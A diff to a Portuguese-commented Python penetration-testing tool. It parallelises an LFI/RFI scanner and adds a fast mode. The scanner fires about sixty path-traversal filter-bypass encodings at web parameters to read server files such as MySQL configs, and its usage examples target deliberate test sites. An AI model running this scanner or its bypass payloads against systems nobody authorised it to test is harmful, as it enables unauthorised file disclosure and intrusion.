@@ -8214,78 +8214,183 @@ class LFIScanner:
             "/opt/local/etc/mysql5/my.cnf": ["[mysqld]", "datadir"]
         }
 
+    def _get_session(self):
+        """Obtém uma sessão do pool de forma round-robin"""
+        session = self.session_pool[self.current_session_index]
+        self.current_session_index = (self.current_session_index + 1) % len(self.session_pool)
+        return session
+
     def _apply_encoding_techniques(self, payload):
         """Aplica diferentes técnicas de codificação para bypass de filtros"""
-        techniques = [
-            payload,  # Original
-            payload.replace('/', '%2f'),  # URL encoding
-            payload.replace('/', '%252f'),  # Double URL encoding
-            payload.replace('/', '%c0%af'),  # UTF-8 encoding
-            payload.replace('/', '%c1%9c'),  # UTF-8 overlong encoding
-            payload + '%00',  # Null byte termination
-            payload.replace('../', '..\\'),  # Windows path separator
-            payload.replace('../', '....//'),  # Double dot slash
-            payload.replace('../', '..%2f'),  # Mixed encoding
-            payload.replace('../', '..%252f'),  # Double encoded slash
-            payload.replace('../', '..%c0%af'),  # UTF-8 encoded slash
-            payload.replace('../', '..%5c'),  # Backslash encoding
-            payload.replace('../', '..\\..\\'),  # Mixed separators
-            payload.replace('/', '\\'),  # Full backslash
-            payload + '?',  # Query string bypass
-            payload + '#',  # Fragment bypass
-            payload + '/./',  # Current directory bypass
-            payload + '//',  # Double slash
-            payload.replace('/', '/./'),  # Current directory injection
-            payload.replace('/', '//'),  # Double slash injection
-            payload.replace('../', '..;/'),  # Semicolon bypass
-            payload.replace('../', '..%00/'),  # Null byte bypass
-            payload.replace('../', '..%0d%0a/'),  # CRLF bypass
-            payload.replace('../', '..%09/'),  # Tab bypass
-            payload.replace('../', '..%20/'),  # Space bypass
-            payload.replace('../', '..%2e%2e%2f'),  # Full dot encoding
-            payload.replace('../', '%2e%2e%2f'),  # Dot encoding
-            payload.replace('../', '%2e%2e/'),  # Mixed dot encoding
-            payload.replace('../', '..%2f%2e%2e%2f'),  # Complex encoding
-            payload.replace('../', '..\\..\\'),  # Windows double backslash
-            payload.replace('../', '..%5c..%5c'),  # Encoded backslash
-            payload + '\\x00',  # Null byte (hex)
-            payload.replace('/', '%2F'),  # Capital URL encoding
-            payload.replace('../', '..%2F'),  # Mixed case encoding
-            payload.replace('../', '..%2f%2e%2e%2f'),  # Complex lowercase
-            payload.replace('../', '..%2F%2E%2E%2F'),  # Complex uppercase
-            payload.replace('../', '....%2f%2f'),  # Quadruple dot
-            payload.replace('../', '....\\\\'),  # Quadruple backslash
-            payload.replace('../', '..%u002f'),  # Unicode encoding
-            payload.replace('../', '..%u005c'),  # Unicode backslash
-            payload.replace('../', '..\\u002f'),  # Mixed unicode
-            payload.replace('../', '..\\u005c'),  # Mixed unicode backslash
-            payload.replace('../', '..%c0%2f'),  # Overlong UTF-8
-            payload.replace('../', '..%e0%80%af'),  # Overlong UTF-8 variant
-            payload.replace('../', '..%f0%80%80%af'),  # Overlong UTF-8 variant 2
-            payload.replace('../', '..%c0%ae%c0%ae%c0%af'),  # Multiple overlong
-            payload.replace('../', '..%c0%ae%c0%ae/'),  # Mixed overlong
-            payload.replace('../', '..%c0%ae%c0%ae%2f'),  # Mixed overlong encoded
-            payload.replace('../', '..%c0%ae%c0%ae%5c'),  # Mixed overlong backslash
-            payload.replace('../', '..%c0%ae%c0%ae\\'),  # Mixed overlong literal
-            payload.replace('../', '..%c0%ae\\%c0%ae\\'),  # Complex overlong
-            payload.replace('../', '..%c0%ae%2f%c0%ae%2f'),  # Complex overlong slash
-            payload.replace('../', '..%c0%ae%5c%c0%ae%5c'),  # Complex overlong backslash
-            payload.replace('../', '..%c0%ae../'),  # Mixed overlong traversal
-            payload.replace('../', '..%c0%ae\\..\\'),  # Mixed overlong windows
-            payload + '\\x00\\x00',  # Double null byte
-            payload + '\\x00\\x00\\x00',  # Triple null byte
-            payload + '%00%00',  # Double encoded null
-            payload + '%00%00%00',  # Triple encoded null
-            payload + '\\0',  # String null terminator
-            payload + '\\0\\0',  # Double string null
-        ]
-        return techniques
+        if self.fast_mode:
+            # Modo rápido: apenas as técnicas mais eficazes
+            techniques = [
+                payload,  # Original
+                payload.replace('/', '%2f'),  # URL encoding
+                payload.replace('/', '%252f'),  # Double URL encoding
+                payload.replace('../', '..\\'),  # Windows path separator
+                payload + '%00',  # Null byte termination
+                payload.replace('../', '..%2f'),  # Mixed encoding
+                payload.replace('../', '..%2e%2e%2f'),  # Full dot encoding
+                payload.replace('../', '..%c0%af'),  # UTF-8 encoded slash
+                payload.replace('../', '..%00/'),  # Null byte bypass
+                payload.replace('../', '....//'),  # Double dot slash
+            ]
+        else:
+            # Modo completo: todas as técnicas
+            techniques = [
+                payload,  # Original
+                payload.replace('/', '%2f'),  # URL encoding
+                payload.replace('/', '%252f'),  # Double URL encoding
+                payload.replace('/', '%c0%af'),  # UTF-8 encoding
+                payload.replace('/', '%c1%9c'),  # UTF-8 overlong encoding
+                payload + '%00',  # Null byte termination
+                payload.replace('../', '..\\'),  # Windows path separator
+                payload.replace('../', '....//'),  # Double dot slash
+                payload.replace('../', '..%2f'),  # Mixed encoding
+                payload.replace('../', '..%252f'),  # Double encoded slash
+                payload.replace('../', '..%c0%af'),  # UTF-8 encoded slash
+                payload.replace('../', '..%5c'),  # Backslash encoding
+                payload.replace('../', '..\\..\\'),  # Mixed separators
+                payload.replace('/', '\\'),  # Full backslash
+                payload + '?',  # Query string bypass
+                payload + '#',  # Fragment bypass
+                payload + '/./',  # Current directory bypass
+                payload + '//',  # Double slash
+                payload.replace('/', '/./'),  # Current directory injection
+                payload.replace('/', '//'),  # Double slash injection
+                payload.replace('../', '..;/'),  # Semicolon bypass
+                payload.replace('../', '..%00/'),  # Null byte bypass
+                payload.replace('../', '..%0d%0a/'),  # CRLF bypass
+                payload.replace('../', '..%09/'),  # Tab bypass
+                payload.replace('../', '..%20/'),  # Space bypass
+                payload.replace('../', '..%2e%2e%2f'),  # Full dot encoding
+                payload.replace('../', '%2e%2e%2f'),  # Dot encoding
+                payload.replace('../', '%2e%2e/'),  # Mixed dot encoding
+                payload.replace('../', '..%2f%2e%2e%2f'),  # Complex encoding
+                payload.replace('../', '..\\..\\'),  # Windows double backslash
+                payload.replace('../', '..%5c..%5c'),  # Encoded backslash
+                payload + '\\x00',  # Null byte (hex)
+                payload.replace('/', '%2F'),  # Capital URL encoding
+                payload.replace('../', '..%2F'),  # Mixed case encoding
+                payload.replace('../', '..%2f%2e%2e%2f'),  # Complex lowercase
+                payload.replace('../', '..%2F%2E%2E%2F'),  # Complex uppercase
+                payload.replace('../', '....%2f%2f'),  # Quadruple dot
+                payload.replace('../', '....\\\\'),  # Quadruple backslash
+                payload.replace('../', '..%u002f'),  # Unicode encoding
+                payload.replace('../', '..%u005c'),  # Unicode backslash
+                payload.replace('../', '..\\u002f'),  # Mixed unicode
+                payload.replace('../', '..\\u005c'),  # Mixed unicode backslash
+                payload.replace('../', '..%c0%2f'),  # Overlong UTF-8
+                payload.replace('../', '..%e0%80%af'),  # Overlong UTF-8 variant
+                payload.replace('../', '..%f0%80%80%af'),  # Overlong UTF-8 variant 2
+                payload.replace('../', '..%c0%ae%c0%ae%c0%af'),  # Multiple overlong
+                payload.replace('../', '..%c0%ae%c0%ae/'),  # Mixed overlong
+                payload.replace('../', '..%c0%ae%c0%ae%2f'),  # Mixed overlong encoded
+                payload.replace('../', '..%c0%ae%c0%ae%5c'),  # Mixed overlong backslash
+                payload.replace('../', '..%c0%ae%c0%ae\\'),  # Mixed overlong literal
+                payload.replace('../', '..%c0%ae\\%c0%ae\\'),  # Complex overlong
+                payload.replace('../', '..%c0%ae%2f%c0%ae%2f'),  # Complex overlong slash
+                payload.replace('../', '..%c0%ae%5c%c0%ae%5c'),  # Complex overlong backslash
+                payload.replace('../', '..%c0%ae../'),  # Mixed overlong traversal
+                payload.replace('../', '..%c0%ae\\..\\'),  # Mixed overlong windows
+                payload + '\\x00\\x00',  # Double null byte
+                payload + '\\x00\\x00\\x00',  # Triple null byte
+                payload + '%00%00',  # Double encoded null
+                payload + '%00%00%00',  # Triple encoded null
+                payload + '\\0',  # String null terminator
+                payload + '\\0\\0',  # Double string null
+            ]
+        
+        # Remove duplicatas mantendo ordem
+        seen = set()
+        unique_techniques = []
+        for tech in techniques:
+            if tech not in seen:
+                seen.add(tech)
+                unique_techniques.append(tech)
+        
+        return unique_techniques
+
+    def _test_payload(self, args):
+        """Testa um payload específico (para uso com ThreadPoolExecutor)"""
+        url, method, param, form_data, payload, path, signatures, session = args
+        
+        try:
+            start_time = time.time()
+            
+            test_data = {param: payload}
+            if method.lower() == 'get':
+                response = session.get(url, params=test_data, timeout=self.timeout, verify=False)
+            else:
+                post_payload = form_data.copy() if form_data else {}
+                post_payload[param] = payload
+                response = session.post(url, data=post_payload, timeout=self.timeout, verify=False)
+            
+            response_time = time.time() - start_time
+            
+            # Detecção por assinatura
+            for signature in signatures:
+                if signature.lower() in response.text.lower():
+                    finding = {
+                        "Risco": "Alto",
+                        "Tipo": "Local File Inclusion (LFI)",
+                        "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
+                        "Recomendação": f"Payload '{payload}' retornou conteúdo do arquivo '{path}'.",
+                        "Payload": payload,
+                        "File_Path": path,
+                        "Signature": signature,
+                        "Response_Time": round(response_time, 3),
+                        "Response_Length": len(response.text),
+                        "Status_Code": response.status_code,
+                        "Encoding_Technique": self._get_encoding_technique(payload, f"../{path}")
+                    }
+                    return finding
+            
+            # Detecção por timing
+            if response_time > 2.0 and response.status_code == 200:
+                timing_finding = {
+                    "Risco": "Médio",
+                    "Tipo": "Possível LFI (Timing-based)",
+                    "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
+                    "Recomendação": f"Payload '{payload}' causou delay suspeito de {response_time:.2f}s.",
+                    "Payload": payload,
+                    "File_Path": path,
+                    "Response_Time": round(response_time, 3),
+                    "Response_Length": len(response.text),
+                    "Status_Code": response.status_code,
+                    "Detection_Method": "Timing-based"
+                }
+                return timing_finding
+            
+            # Detecção por código de status anômalo
+            if response.status_code in [403, 500, 502, 503] and len(response.text) > 100:
+                error_finding = {
+                    "Risco": "Baixo",
+                    "Tipo": "Possível LFI (Error-based)",
+                    "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
+                    "Recomendação": f"Payload '{payload}' causou erro HTTP {response.status_code}.",
+                    "Payload": payload,
+                    "File_Path": path,
+                    "Response_Time": round(response_time, 3),
+                    "Response_Length": len(response.text),
+                    "Status_Code": response.status_code,
+                    "Detection_Method": "Error-based"
+                }
+                return error_finding
+                
+        except requests.RequestException:
+            pass
+        
+        return None
 
     def _test_rfi(self, url, method, param, form_data=None):
         """Testa Remote File Inclusion (RFI)"""
         if self.verbose:
             console.print(f"[*] Testando RFI no parâmetro [cyan]{param}[/cyan]...")
             
+        session = self._get_session()
+        
         for rfi_payload in self.rfi_payloads:
             if self.verbose:
                 console.print(f"    [*] Testando payload RFI: [yellow]{rfi_payload}[/yellow]")
@@ -8293,11 +8398,11 @@ class LFIScanner:
             try:
                 test_data = {param: rfi_payload}
                 if method.lower() == 'get':
-                    response = self.session.get(url, params=test_data, timeout=self.timeout, verify=False)
+                    response = session.get(url, params=test_data, timeout=self.timeout, verify=False)
                 else:
                     post_payload = form_data.copy() if form_data else {}
                     post_payload[param] = rfi_payload
-                    response = self.session.post(url, data=post_payload, timeout=self.timeout, verify=False)
+                    response = session.post(url, data=post_payload, timeout=self.timeout, verify=False)
                 
                 if self.verbose:
                     console.print(f"    [*] Resposta: {response.status_code} - {len(response.text)} bytes")
@@ -8337,7 +8442,7 @@ class LFIScanner:
         return False
 
     def _scan_target(self, url, method, param, form_data=None):
-        """Escaneia um alvo específico para vulnerabilidades LFI/RFI"""
+        """Escaneia um alvo específico para vulnerabilidades LFI/RFI com paralelização"""
         if self.verbose:
             console.print(f"[*] Analisando parâmetro [cyan]{param}[/cyan] via [yellow]{method.upper()}[/yellow]")
             
@@ -8345,111 +8450,92 @@ class LFIScanner:
         if self._test_rfi(url, method, param, form_data):
             return
             
-        # Depois testa LFI
+        # Depois testa LFI com paralelização
         if self.verbose:
             console.print(f"[*] Testando LFI no parâmetro [cyan]{param}[/cyan] ({len(self.payloads)} arquivos alvo)...")
             
-        files_tested = 0
+        # Preparar tasks para ThreadPoolExecutor
+        tasks = []
+        session_index = 0
+        
         for path, signatures in self.payloads.items():
-            if self.verbose and files_tested % 10 == 0:
-                console.print(f"    [*] Progresso: {files_tested}/{len(self.payloads)} arquivos testados...")
-                
-            for i in range(10):  # Aumentado para 10 níveis de traversal
+            levels_to_test = 5 if self.fast_mode else 10  # Reduz níveis no modo rápido
+            
+            for i in range(levels_to_test):
                 base_payload = "../" * i + path
-                
-                # Aplica diferentes técnicas de encoding
                 encoded_payloads = self._apply_encoding_techniques(base_payload)
                 
-                for payload_index, payload in enumerate(encoded_payloads):
-                    if self.verbose and payload_index == 0:  # Mostra apenas o payload original no verbose
-                        console.print(f"        [*] Testando arquivo: [blue]{path}[/blue] (nível {i})")
+                for payload in encoded_payloads:
+                    # Atribuir sessão de forma round-robin
+                    session = self.session_pool[session_index % len(self.session_pool)]
+                    session_index += 1
+                    
+                    task_args = (url, method, param, form_data, payload, path, signatures, session)
+                    tasks.append(task_args)
+                    
+                    # Limitar número de tasks para evitar sobrecarga
+                    if len(tasks) >= 1000 and self.fast_mode:
+                        break
                         
-                    try:
-                        start_time = time.time()
+                if len(tasks) >= 1000 and self.fast_mode:
+                    break
+                    
+            if len(tasks) >= 1000 and self.fast_mode:
+                break
+        
+        if self.verbose:
+            console.print(f"[*] Preparadas {len(tasks)} tasks para execução paralela...")
+            
+        # Executar tasks em paralelo
+        vulnerabilities_found = []
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            if self.verbose:
+                console.print(f"[*] Executando com {self.threads} threads...")
+                
+            # Submeter todas as tasks
+            future_to_task = {executor.submit(self._test_payload, task): task for task in tasks}
+            
+            # Processar resultados conforme ficam prontos
+            completed_tasks = 0
+            for future in as_completed(future_to_task):
+                completed_tasks += 1
+                
+                if self.verbose and completed_tasks % 100 == 0:
+                    console.print(f"    [*] Progresso: {completed_tasks}/{len(tasks)} tasks completadas...")
+                
+                try:
+                    result = future.result()
+                    if result:
+                        vulnerabilities_found.append(result)
                         
-                        test_data = {param: payload}
-                        if method.lower() == 'get':
-                            response = self.session.get(url, params=test_data, timeout=self.timeout, verify=False)
-                        else:
-                            post_payload = form_data.copy() if form_data else {}
-                            post_payload[param] = payload
-                            response = self.session.post(url, data=post_payload, timeout=self.timeout, verify=False)
-                        
-                        response_time = time.time() - start_time
-                        
-                        # Detecção por assinatura
-                        for signature in signatures:
-                            if signature.lower() in response.text.lower():
-                                if self.verbose:
-                                    encoding_tech = self._get_encoding_technique(payload, base_payload)
-                                    console.print(f"        [bold green][+] LFI DETECTADO![/bold green] Assinatura: [green]{signature}[/green]")
-                                    console.print(f"            [*] Técnica: {encoding_tech}")
-                                    console.print(f"            [*] Tempo: {response_time:.3f}s")
-                                    console.print(f"            [*] Status: {response.status_code}")
-                                    
-                                finding = {
-                                    "Risco": "Alto",
-                                    "Tipo": "Local File Inclusion (LFI)",
-                                    "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
-                                    "Recomendação": f"Payload '{payload}' retornou conteúdo do arquivo '{path}'.",
-                                    "Payload": payload,
-                                    "File_Path": path,
-                                    "Signature": signature,
-                                    "Response_Time": round(response_time, 3),
-                                    "Response_Length": len(response.text),
-                                    "Status_Code": response.status_code,
-                                    "Encoding_Technique": self._get_encoding_technique(payload, base_payload)
-                                }
-                                if finding not in self.vulnerable_points:
-                                    self.vulnerable_points.append(finding)
-                                    return
-                        
-                        # Detecção por timing (arquivos grandes podem causar delay)
-                        if response_time > 2.0 and response.status_code == 200:
-                            if self.verbose:
-                                console.print(f"        [yellow][!] Timing suspeito detectado: {response_time:.2f}s[/yellow]")
-                                
-                            timing_finding = {
-                                "Risco": "Médio",
-                                "Tipo": "Possível LFI (Timing-based)",
-                                "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
-                                "Recomendação": f"Payload '{payload}' causou delay suspeito de {response_time:.2f}s.",
-                                "Payload": payload,
-                                "File_Path": path,
-                                "Response_Time": round(response_time, 3),
-                                "Response_Length": len(response.text),
-                                "Status_Code": response.status_code,
-                                "Detection_Method": "Timing-based"
-                            }
-                            if timing_finding not in self.vulnerable_points:
-                                self.vulnerable_points.append(timing_finding)
-                        
-                        # Detecção por código de status anômalo
-                        if response.status_code in [403, 500, 502, 503] and len(response.text) > 100:
-                            if self.verbose:
-                                console.print(f"        [orange3][!] Erro HTTP suspeito: {response.status_code}[/orange3]")
-                                
-                            error_finding = {
-                                "Risco": "Baixo",
-                                "Tipo": "Possível LFI (Error-based)",
-                                "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
-                                "Recomendação": f"Payload '{payload}' causou erro HTTP {response.status_code}.",
-                                "Payload": payload,
-                                "File_Path": path,
-                                "Response_Time": round(response_time, 3),
-                                "Response_Length": len(response.text),
-                                "Status_Code": response.status_code,
-                                "Detection_Method": "Error-based"
-                            }
-                            if error_finding not in self.vulnerable_points:
-                                self.vulnerable_points.append(error_finding)
-                                
-                    except requests.RequestException as e:
                         if self.verbose:
-                            console.print(f"        [red][!] Erro na requisição: {e}[/red]")
-                        continue
+                            console.print(f"        [bold green][+] VULNERABILIDADE DETECTADA![/bold green]")
+                            console.print(f"            [*] Tipo: {result['Tipo']}")
+                            console.print(f"            [*] Arquivo: {result.get('File_Path', 'N/A')}")
+                            console.print(f"            [*] Técnica: {result.get('Encoding_Technique', result.get('Detection_Method', 'N/A'))}")
                         
-            files_tested += 1
+                        # Se encontrou vulnerabilidade crítica ou alta, pode parar
+                        if self.stop_on_first and result['Risco'] in ['Crítico', 'Alto']:
+                            if self.verbose:
+                                console.print(f"    [*] Parando após primeira vulnerabilidade de alto risco...")
+                            # Cancelar tasks pendentes
+                            for f in future_to_task:
+                                f.cancel()
+                            break
+                            
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"    [red][!] Erro na task: {e}[/red]")
+                    continue
+        
+        # Adicionar vulnerabilidades encontradas
+        for vuln in vulnerabilities_found:
+            if vuln not in self.vulnerable_points:
+                self.vulnerable_points.append(vuln)
+                
+        if self.verbose:
+            console.print(f"[*] Scan do parâmetro concluído. Vulnerabilidades encontradas: {len(vulnerabilities_found)}")
 
     def _get_encoding_technique(self, encoded_payload, original_payload):
         """Identifica a técnica de codificação usada"""
@@ -8477,10 +8563,25 @@ class LFIScanner:
             console.print("-" * 80)
             console.print(f"[*] Executando scanner avançado de LFI/RFI em: [bold cyan]{self.base_url}[/bold cyan]")
             console.print(f"[*] Timeout: {self.timeout}s | Threads: {self.threads} | Payloads: {len(self.payloads)}")
+            
+            if self.fast_mode:
+                console.print(f"[*] Modo: [yellow]RÁPIDO[/yellow] - Usando técnicas otimizadas")
+                console.print(f"[*] Técnicas de bypass: {len(self._apply_encoding_techniques('test'))} variações por payload")
+                console.print(f"[*] Níveis de path traversal: 5 (otimizado)")
+            else:
+                console.print(f"[*] Modo: [blue]COMPLETO[/blue] - Todas as técnicas disponíveis")
+                console.print(f"[*] Técnicas de bypass: {len(self._apply_encoding_techniques('test'))} variações por payload")
+                console.print(f"[*] Níveis de path traversal: 10 (completo)")
+            
+            if self.stop_on_first:
+                console.print(f"[*] Estratégia: [green]STOP-ON-FIRST[/green] - Para na primeira vulnerabilidade crítica/alta")
+            
             if self.verbose:
                 console.print(f"[*] Modo verbose: [green]ATIVO[/green] - Exibindo detalhes completos")
-                console.print(f"[*] Técnicas de bypass: {len(self._apply_encoding_techniques('test'))} variações por payload")
                 console.print(f"[*] RFI payloads: {len(self.rfi_payloads)} URLs de teste")
+                console.print(f"[*] Pool de sessões: {len(self.session_pool)} sessões HTTP reutilizáveis")
+                console.print(f"[*] Execução: [cyan]PARALELA[/cyan] com ThreadPoolExecutor")
+                
             console.print("-" * 80)
         
         start_time = time.time()
@@ -8749,10 +8850,12 @@ class LFIScanner:
         except Exception as e:
             console.print(f"[red]Erro ao exportar resultados: {e}[/red]")
 
-def lfi_scan(url, timeout=10, threads=5, export_results=False, verbose=False):
-    """Função principal para executar scan de LFI/RFI"""
+def lfi_scan(url, timeout=10, threads=5, export_results=False, verbose=False, fast_mode=False, stop_on_first=False):
+    """Função principal para executar scan de LFI/RFI otimizado"""
     scanner = LFIScanner(url, timeout=timeout, threads=threads)
     scanner.verbose = verbose
+    scanner.fast_mode = fast_mode
+    scanner.stop_on_first = stop_on_first
     return scanner.run_scan(export_results=export_results)
 
 # --- MÓDULO 18: SCANNER DE SSRF (SERVER-SIDE REQUEST FORGERY) ---
@@ -10185,6 +10288,12 @@ Exemplos de Uso:
   
   # Scanner LFI com modo verbose para análise detalhada das técnicas
   python %(prog)s lfi-scan -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --verbose --export
+  
+  # Scanner LFI em modo rápido (10x mais rápido, técnicas otimizadas)
+  python %(prog)s lfi-scan -u "https://demo.testfire.net/bank/main.aspx" --fast --threads 15
+  
+  # Scanner LFI completo com máxima performance e para na primeira vulnerabilidade
+  python %(prog)s lfi-scan -u "http://dvwa.local/vulnerabilities/fi/" --threads 20 --stop-on-first --fast
 
   # Procura por CVEs para OpenSSL, ignorando o cache e filtrando por CVSS
   python %(prog)s cve-scan --product openssl --version 1.0.2 --min-cvss 7.0 --no-cache
@@ -10309,9 +10418,11 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     parser_lfi = subparsers.add_parser('lfi-scan', help='[Scan] Scanner avançado de LFI/RFI com 86+ payloads e múltiplas técnicas de bypass.')
     parser_lfi.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
     parser_lfi.add_argument('-t', '--timeout', type=int, default=10, help='Timeout para requisições em segundos (padrão: 10)')
-    parser_lfi.add_argument('--threads', type=int, default=5, help='Número de threads para processamento (padrão: 5)')
+    parser_lfi.add_argument('--threads', type=int, default=5, help='Número de threads para processamento paralelo (padrão: 5, máx: 20)')
     parser_lfi.add_argument('--export', action='store_true', help='Exportar resultados para arquivo JSON')
     parser_lfi.add_argument('--verbose', action='store_true', help='Exibe informações detalhadas sobre técnicas de bypass, detecções e progresso do scan.')
+    parser_lfi.add_argument('--fast', action='store_true', help='Modo rápido: usa apenas técnicas de bypass mais eficazes (10x mais rápido)')
+    parser_lfi.add_argument('--stop-on-first', action='store_true', help='Para após encontrar primeira vulnerabilidade de alto risco')
 
     parser_ssrf = subparsers.add_parser('ssrf-scan', help='[Scan] Procura por falhas de Server-Side Request Forgery (SSRF).')
     parser_ssrf.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
@@ -10504,7 +10615,20 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     elif args.tool == 'cmd-scan':
         command_injection_scan(args.url)
     elif args.tool == 'lfi-scan':
-        lfi_scan(args.url, timeout=args.timeout, threads=args.threads, export_results=args.export, verbose=args.verbose)
+        # Limitar threads para evitar sobrecarga
+        max_threads = min(args.threads, 20)
+        if args.threads > 20:
+            console.print(f"[yellow][!] Limitando threads de {args.threads} para 20 para evitar sobrecarga do sistema[/yellow]")
+        
+        lfi_scan(
+            args.url, 
+            timeout=args.timeout, 
+            threads=max_threads, 
+            export_results=args.export, 
+            verbose=args.verbose,
+            fast_mode=args.fast,
+            stop_on_first=args.stop_on_first
+        )
     elif args.tool == 'ssrf-scan':
         ssrf_scan(args.url)
     elif args.tool == 'open-redirect-scan':
